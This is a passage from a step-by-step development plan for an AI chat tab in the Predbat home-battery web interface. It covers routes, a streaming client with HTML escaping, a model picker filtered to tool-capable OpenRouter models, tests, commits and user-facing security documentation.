        app.router.add_get("/chat/stream", self.chat_page.html_chat_stream)
        app.router.add_post("/chat/confirm", self.chat_page.html_chat_confirm)
        app.router.add_post("/chat/cancel", self.chat_page.html_chat_cancel)
        app.router.add_get("/chat/models", self.chat_page.html_chat_models)
        app.router.add_post("/chat/model", self.chat_page.html_chat_model)
```

4. Call it in `start()` immediately after `self._register_annual_routes(app)`: `self._register_chat_routes(app)`.

For this task only, `html_chat_models` and `html_chat_model` do not exist yet — add these two placeholders to `WebChat` so route registration resolves, and replace them properly in Task 11:

```python
    async def html_chat_models(self, request):
        """Return the model catalogue for the picker."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        return web.json_response({"models": [{"id": agent.default_model, "name": agent.default_model}], "default_model": agent.default_model})

    async def html_chat_model(self, request):
        """Set the model for one conversation."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        body = await request.json()
        meta, error = self._conversation_or_404(agent, body.get("conversation"))
        if error:
            return error
        agent.store.set_model(body.get("conversation"), body.get("id") or None)
        await agent.run_on_agent_loop(agent.store.flush(body.get("conversation")))
        return web.json_response({"ok": True})
```

- [ ] **Step 5: Run the tests to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test web_chat --test web_if > /tmp/web_chat_2.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/web_chat_2.txt | head -30
```

Expected: both pass. `web_if` passing confirms the `web.py` changes did not disturb the existing interface.

- [ ] **Step 6: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/web_chat.py apps/predbat/tests/test_web_chat.py apps/predbat/web.py apps/predbat/unit_test.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add the Chat tab routes and SSE stream

Cursor replay over the agent's event buffer rather than a live queue, so
two browsers follow the same turn, a mid-turn reload resumes, and
switching conversations is just a new cursor. Global busy/idle events
reach every browser whatever it is viewing, which is what lets a user
read another conversation while a turn runs.

Routes register only when the component is configured, so the tab does
not exist on an install without OpenRouter credentials."
```

---

## Task 10: The Chat tab interface

**Files:**
- Modify: `apps/predbat/web_chat.py`
- Modify: `apps/predbat/web_helper.py`
- Modify: `apps/predbat/web.py`
- Modify: `apps/predbat/tests/test_web_chat.py`

**Interfaces:**
- Consumes: Task 9's routes and `format_sse_event`.
- Produces: real `get_chat_styles()`, `get_chat_body()`, `get_chat_script()`; `get_header_html(..., chat_enabled=False)`.

- [ ] **Step 1: Add the nav link**

In `apps/predbat/web_helper.py`, change the signature at line 7441 to:

```python
def get_header_html(title, calculating, default_page, arg_errors, THIS_VERSION, battery_status_icon, refresh=0, codemirror=False, chat_enabled=False):
```

and in the menu bar block (around line 8308), insert the Chat link after the WhatIf entry:

```python
<a href='./annual'>WhatIf</a>
"""
        + ("<a href='./chat'>Chat</a>\n" if chat_enabled else "")
        + """<a href='./log'>Log</a>
```

The default of `False` keeps the existing test call site at `tests/test_web_functions.py:454` valid.

In `apps/predbat/web.py`, pass it from `get_header` (line 1693):

```python
        return get_header_html(title, calculating, self.default_page, self.arg_errors, THIS_VERSION_DISPLAY, self.get_battery_status_icon(), refresh, codemirror=codemirror, chat_enabled=self.chat_enabled())
```

- [ ] **Step 2: Extend the failing test**

Append to `apps/predbat/tests/test_web_chat.py` and add it to the driver:

```python
def test_nav_link_visibility(my_predbat):
    """The Chat nav link is emitted only when chat is enabled."""
    failed = False
    print("**** Testing the Chat nav link ****")
    from web_helper import get_header_html

    without = get_header_html("Test", False, "./dash", [], "v1.0", "", chat_enabled=False)
    if "./chat" in without:
        print("ERROR: the Chat link appears with chat disabled")
        failed = True

    with_chat = get_header_html("Test", False, "./dash", [], "v1.0", "", chat_enabled=True)
    if "./chat" not in with_chat:
        print("ERROR: the Chat link is missing with chat enabled")
        failed = True

    default = get_header_html("Test", False, "./dash", [], "v1.0", "")
    if "./chat" in default:
        print("ERROR: the Chat link appears by default, which would break every existing caller")
        failed = True

    return failed


def test_client_script_contract(my_predbat):
    """The client script wires the SSE events the server actually emits."""
    failed = False
    print("**** Testing the client script contract ****")
    script = web_chat.get_chat_script()
    for event in ["delta", "assistant", "tool_start", "tool_end", "confirm", "confirm_result", "usage", "title", "error", "done", "busy", "idle", "reload"]:
        if "'{}'".format(event) not in script and '"{}"'.format(event) not in script:
            print("ERROR: the client script does not handle the {!r} event".format(event))
            failed = True
    for endpoint in ["/chat/conversations", "/chat/history", "/chat/send", "/chat/stream", "/chat/confirm", "/chat/delete", "/chat/rename"]:
        if endpoint not in script:
            print("ERROR: the client script never calls {}".format(endpoint))
            failed = True
    if "localStorage" not in script:
        print("ERROR: the client script does not persist the selected conversation")
        failed = True
    return failed
```

- [ ] **Step 3: Write the real interface**

Replace the three stubs in `apps/predbat/web_chat.py`.

`get_chat_styles()` returns a `<style>` block laying out a two-column grid: a 260px conversation
list on the left (title, relative time, cost, a `pending` badge, rename and delete controls, a
**New chat** button pinned at the top) and the transcript plus composer on the right. Follow the
existing pages' colour approach so `toggleDarkMode()` works: read colours from the same CSS
custom properties the other tabs use rather than hard-coding light values.

`get_chat_body()` returns the markup: `#chat-sidebar`, `#chat-list`, `#chat-new`,
`#chat-banner` (the busy notice, hidden by default), `#chat-transcript`, `#chat-composer`
(a `<textarea id="chat-input">` plus a send button), and `#chat-footer` holding
`#chat-model` (the picker, populated in Task 11), `#chat-turn-usage` and `#chat-total-cost`.
Also `#chat-privacy`, a dismissible banner naming OpenRouter and the selected model's provider
as the destination for tool results including log lines and configuration.

`get_chat_script()` returns the client. These parts are not optional:

```javascript
function escapeHtml(text) {
    return String(text === null || text === undefined ? '' : text).replace(/[&<>"']/g, function (character) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[character];
    });
}

// Escape first, then transform. Model output and conversation titles are both untrusted text -
// a title is derived from whatever the user or the model wrote - so nothing reaches innerHTML
// before it has been through escapeHtml.
function renderMarkdown(text) {
    var safe = escapeHtml(text);
    safe = safe.replace(/```([\s\S]*?)```/g, function (match, code) { return '<pre><code>' + code + '</code></pre>'; });
    safe = safe.replace(/`([^`\n]+)`/g, '<code>$1</code>');
    safe = safe.replace(/\*\*([^*\n]+)\*\*/g, '<strong>$1</strong>');
    safe = safe.replace(/(^|[^*])\*([^*\n]+)\*/g, '$1<em>$2</em>');
    safe = safe.replace(/\[([^\]\n]+)\]\((https?:\/\/[^)\s]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
    safe = safe.replace(/^\s*[-*]\s+(.*)$/gm, '<li>$1</li>');
    safe = safe.replace(/^\s*\d+\.\s+(.*)$/gm, '<li>$1</li>');
    safe = safe.replace(/(<li>[\s\S]*?<\/li>)/g, '<ul>$1</ul>');
    return safe.replace(/\n/g, '<br>');
}

function setTitleText(node, title) {
    node.textContent = title;
}
```

The rest of the client:

- `state = { conversation: localStorage.getItem('predbatChatConversation'), cursor: 0, source: null, busy: null }`.
- `selectConversation(id)` stores the id in `localStorage`, `GET /chat/history?conversation=<id>`, repaints the transcript, sets `state.cursor` from the response, and reopens the stream.
- `openStream()` closes any existing `EventSource` and opens `new EventSource('./chat/stream?conversation=' + id + '&cursor=' + state.cursor)`, with a named listener per event type.
- `delta` appends to the in-progress assistant bubble; `assistant` replaces it with the completed text via `renderMarkdown` and appends a sources list if `data.sources` is non-empty.
- `tool_start` appends a **collapsed** row — a `<details>` whose `<summary>` reads `called <code>name</code>`, with the arguments and, on `tool_end`, the result inside. Collapsed is the default state; the user opens what they care about.
- `confirm` renders an expanded card naming the tool and its decoded arguments with Approve and Reject buttons posting to `/chat/confirm`. `confirm_result` replaces the card with the outcome.
- `busy` disables the composer in every conversation and shows `#chat-banner` reading `Replying in '<title>'` with a link calling `selectConversation(data.conversation_id)`; `idle` re-enables and hides it.
- `usage` updates the footer; `title` calls `setTitleText` on the matching list row; `error` renders an error bubble; `done` clears the in-progress bubble.
- `reload` refetches `/chat/history` and reopens the stream from the fresh cursor.
- Enter sends, Shift+Enter inserts a newline. A 409 from `/chat/send` shows the banner using the returned `conversation_id` and `title` rather than a generic "busy".
- `refreshConversations()` polls `GET /chat/conversations` on load and after create/rename/delete, rendering rows with `textContent` for titles.

- [ ] **Step 4: Run the tests to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test web_chat --test web_functions --test web_if > /tmp/web_chat_3.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/web_chat_3.txt | head -30
```

Expected: all three pass. `web_functions` covers the existing `get_header_html` caller.

- [ ] **Step 5: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/web_chat.py apps/predbat/web_helper.py apps/predbat/web.py apps/predbat/tests/test_web_chat.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add the Chat tab interface

Conversation list, transcript, composer and footer, with tool calls
rendered collapsed behind a disclosure triangle and confirmation cards
expanded inline.

The markdown renderer escapes HTML before transforming, for message text
and for conversation titles alike - a title is derived from whatever the
user or the model wrote, so both are untrusted."
```

---

## Task 11: The model picker

**Files:**
- Modify: `apps/predbat/web_chat.py`
- Modify: `apps/predbat/chat.py`
- Modify: `apps/predbat/tests/test_web_chat.py`

**Interfaces:**
- Consumes: Task 9's placeholder `html_chat_models` / `html_chat_model`.
- Produces: `async ChatAgent.list_models() -> list[dict]`; real `html_chat_models`.

- [ ] **Step 1: Write the failing test**

Append to `apps/predbat/tests/test_web_chat.py` and add to the driver:

```python
def test_model_catalogue(my_predbat):
    """Only tool-capable models are offered, and the apps.yaml model always is."""
    failed = False
    print("**** Testing the model catalogue ****")
    import chat as chat_module

    agent = chat_module.ChatAgent.__new__(chat_module.ChatAgent)
    agent.default_model = "configured/model"
    agent.base_url = "https://openrouter.example/api/v1"
    agent.log = print
    agent.storage_override = None

    async def fake_catalogue():
        """Return a catalogue with one tool-capable model and one without."""
        return {"data": [{"id": "good/model", "name": "Good", "supported_parameters": ["tools", "temperature"]}, {"id": "bad/model", "name": "Bad", "supported_parameters": ["temperature"]}]}

    agent.storage = None
    agent._fetch_model_catalogue = fake_catalogue
    models = asyncio.run(agent.list_models())
    ids = [entry["id"] for entry in models]
    if "good/model" not in ids:
        print("ERROR: a tool-capable model was dropped: {}".format(ids))
        failed = True
    if "bad/model" in ids:
        print("ERROR: a model without tool support was offered: {}".format(ids))
        failed = True
    if "configured/model" not in ids:
        print("ERROR: the apps.yaml model must always be offered, even when absent from the catalogue")
        failed = True

    async def broken_catalogue():
        """Simulate an unreachable catalogue."""
        return None

    agent._fetch_model_catalogue = broken_catalogue
    fallback = asyncio.run(agent.list_models())
    if [entry["id"] for entry in fallback] != ["configured/model"]:
        print("ERROR: an unreachable catalogue should degrade to the configured model: {}".format(fallback))
        failed = True

    return failed
```

- [ ] **Step 2: Run to verify it fails**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test web_chat > /tmp/web_chat_4.txt 2>&1; grep -iE "AttributeError|ERROR" /tmp/web_chat_4.txt | head -10
```

Expected: FAIL with `AttributeError: 'ChatAgent' object has no attribute 'list_models'`.

- [ ] **Step 3: Implement**

Add to `apps/predbat/chat.py`:

```python
MODEL_CACHE_MINUTES = 1440


    async def _fetch_model_catalogue(self):
        """Download the model catalogue from the configured endpoint."""
        headers = {"Authorization": "Bearer {}".format(self.api_key)}
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("{}/models".format(self.base_url), headers=headers) as response:
                if response.status != 200:
                    return None
                return await response.json()

    async def list_models(self):
        """Return the tool-capable models on offer, always including the configured one.

        A model with no tool support cannot drive this agent at all - it would answer from the
        snapshot alone and never call get_plan - so the picker hides them rather than letting a
        user select one and wonder why the answers got worse.
        """
        catalogue = None
        storage = getattr(self, "storage", None)
        try:
            if storage:
                catalogue = await storage.fetch_cached("chat", "models", self._fetch_model_catalogue, fresh_minutes=MODEL_CACHE_MINUTES, stale_minutes=MODEL_CACHE_MINUTES + 60, format="json")
            else:
                catalogue = await self._fetch_model_catalogue()
        except Exception as error:
            self.log("Warn: could not fetch the model catalogue from {}: {}".format(self.base_url, error))

        models = []
        for entry in (catalogue or {}).get("data") or []:
            if "tools" not in (entry.get("supported_parameters") or []):
                continue
            pricing = entry.get("pricing") or {}
            models.append({"id": entry.get("id"), "name": entry.get("name") or entry.get("id"), "prompt_price": pricing.get("prompt"), "completion_price": pricing.get("completion")})
        models.sort(key=lambda entry: str(entry.get("id")))
        if self.default_model not in [entry["id"] for entry in models]:
            models.insert(0, {"id": self.default_model, "name": "{} (from apps.yaml)".format(self.default_model), "prompt_price": None, "completion_price": None})
        return models
```

Replace the `html_chat_models` placeholder in `web_chat.py`:

```python
    async def html_chat_models(self, request):
        """Return the model catalogue for the picker."""
        agent = self.agent
        if agent is None:
            return web.json_response({"error": "Chat is not configured"}, status=404)
        try:
            models = await agent.run_on_agent_loop(agent.list_models())
        except AgentNotReadyError:
            return web.json_response({"error": "The chat component is still starting"}, status=503)
        return web.json_response({"models": models, "default_model": agent.default_model, "catalogue_available": len(models) > 1})
```

In `get_chat_script()`, populate `#chat-model` from `GET /chat/models` on load, select the
conversation's `model` (or a **Use default** option when it is `null`), and `POST /chat/model`
on change with `{conversation, id}`. When `catalogue_available` is false, add a note that the
catalogue could not be reached.

- [ ] **Step 4: Run to verify it passes and commit**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test web_chat --test chat > /tmp/web_chat_5.txt 2>&1; grep -iE "ERROR|traceback|failed|Result" /tmp/web_chat_5.txt | head -20
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/web_chat.py apps/predbat/chat.py apps/predbat/tests/test_web_chat.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "feat(chat): add a per-conversation model picker

Filtered to tool-capable models, cached once a day, and always offering
the apps.yaml model even when the catalogue does not list it - so a
custom openrouter_base_url with no /models endpoint still works.

The model is stored on the conversation, so a cheap model can be used for
one thread and an expensive one for another."
```

---

## Task 12: Documentation and the full-suite check

**Files:**
- Modify: `docs/components.md`, `docs/web-interface.md`, `docs/apps-yaml.md`
- Modify: `.cspell/custom-dictionary-workspace.txt`

- [ ] **Step 1: Write the components documentation**

In `docs/components.md`, add an "AI Chat Agent (chat)" section after the MCP Server section
(which ends around line 200), following that section's exact structure: **What it does**,
**When to enable**, **Security note**, **Configuration Options**, **Available tools**.

The configuration table lists all ten `apps.yaml` keys from spec section 9.1 with their types,
defaults and descriptions. The security note must state, plainly:

- The web UI has no authentication, so anyone who can reach port 5052 can use the chat, read
  every saved conversation, and spend the user's OpenRouter credit.
- Tool results — including log lines and configuration — are sent to OpenRouter and the selected
  model's provider. Credentials are redacted before they leave.
- Conversations are stored on disk and expire after `chat_expiry_days` of inactivity. **A
  deleted conversation is hidden immediately but its stored copy remains until it expires**, so
  it stays readable to anyone with filesystem access.
- The agent can read its own installed source, but not `apps.yaml`, `secrets.yaml` or the raw
  log through those tools — `get_apps` and `get_log` remain the only routes to those, and they
  redact and filter.
- `chat_web_search` costs roughly $0.001-0.015 per request and is an OpenRouter feature; it is
  ignored if `openrouter_base_url` points elsewhere.

The tool table lists the nine shared tools (cross-referencing the MCP table) plus
`set_chat_title`, `search_docs`, `search_source`, `read_source` and `fetch_url`.

- [ ] **Step 2: Write the web interface documentation**

In `docs/web-interface.md`, add a Chat tab section: conversations and switching, that one reply
runs at a time and the composer locks while it does, the confirmation card and the
`switch.predbat_chat_confirm_writes` toggle, the per-conversation model picker, and the per-turn
and per-conversation cost display.

- [ ] **Step 3: Add the apps.yaml keys**

In `docs/apps-yaml.md`, document the ten keys in the same style as the surrounding entries, with
`openrouter_api_key` and `openrouter_model` marked as the pair that enables the feature.

- [ ] **Step 4: Run pre-commit and fix spelling**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add docs/
./run_pre_commit
```

Expected: CSpell flags `openrouter`, and likely `ollama` and `litellm`. Add them to
`.cspell/custom-dictionary-workspace.txt`, re-run, then `git add` again — the file is
auto-sorted on commit, so it must be re-staged.

- [ ] **Step 5: Run the whole suite**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all > /tmp/chat_full.txt 2>&1; grep -iE "^Result|FAILED|ERROR|Traceback" /tmp/chat_full.txt | head -40
```

Expected: no failures. Compare against the baseline captured before Task 1 — this feature must
add no failures anywhere else, and `web_mcp` in particular must still pass unchanged.

- [ ] **Step 6: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add docs/ .cspell/
git commit -m "docs: document the AI chat agent

Covers the apps.yaml keys, the two switches, the tool list, and the
things a user should know before enabling it: that the web UI has no
authentication, that tool results go to a third-party model, and that a
deleted conversation stays on disk until it expires."
```

---

## Self-Review

**Spec coverage.** Every numbered spec section maps to a task: §2 and §5 → Task 1; §6 and §12 →
Tasks 6-7; §7.1 → Task 3; §7.2 → Task 4; §7.3 → Task 5; §7.4 and §15.2 → Tasks 8 and 11; §8 and
§9 → Task 6; §10 → Task 2; §11 → Task 7; §13 → Task 8; §14 → Tasks 4, 5, 8 and 10; §15 → Tasks
9-11; §16 → Tasks 7-9; §17 → every task's test step; §18 → the task order; §20 → Task 12.

**Known gaps, deliberately carried:**

1. `POST /chat/cancel` sets `agent.deadline = 0`, which stops the turn at its next iteration
   boundary rather than mid-stream. That is honest but not instant; the spec's wording implies
   an abort. Acceptable for v1 — say so in the UI ("stopping after this step").
2. A turn scheduled on the component loop dies if the component is stopped or restarted
   mid-turn, because `asyncio.run()` closes that loop on exit, so the `finally` in
   `_execute_turn` never runs. Task 6's `_release_stale_turn()` covers it, measuring elapsed
   wall-clock against the turn's own deadline plus `STALE_TURN_GRACE_SECONDS`. A quiet-tick
   count would not do: the housekeeping tick fires every 60s and a turn emits nothing between
   its `busy` event and the model's first token, so a two-tick rule frees live turns somewhere
   between 60 and 120 seconds regardless of `chat_turn_timeout`. The cost of the deadline-based
   rule is that a stranded slot survives up to `turn_timeout + 60s`, which only matters after a
   component restart.

**Concurrency review.** Each cross-thread call was checked against the contract: `submit_turn`,
`claim_turn`, `confirm`, `emit`, `events_since`, `get_meta` and `list_conversations` are
synchronous and lock-guarded, so the web thread may call them directly. `store.create`,
`store.delete`, `store.flush`, `store.get_messages` and `list_models` all touch Storage and are
therefore routed through `run_on_agent_loop`, keeping every write on one loop. Nothing in a
handler awaits model or tool work.

**Type consistency checked:** `ConversationStore.create(model=None, protect_id=None)` is called
with `protect_id` in Task 9; `events_since` returns a 3-tuple everywhere it is used;
`_dispatch` and `execute` both return `{"success", "error", "data"}`; `emit(conversation_id,
event_type, data)` argument order is the same in `chat.py` and the tests; `format_sse_event`
consumes the exact dict shape `emit` produces.
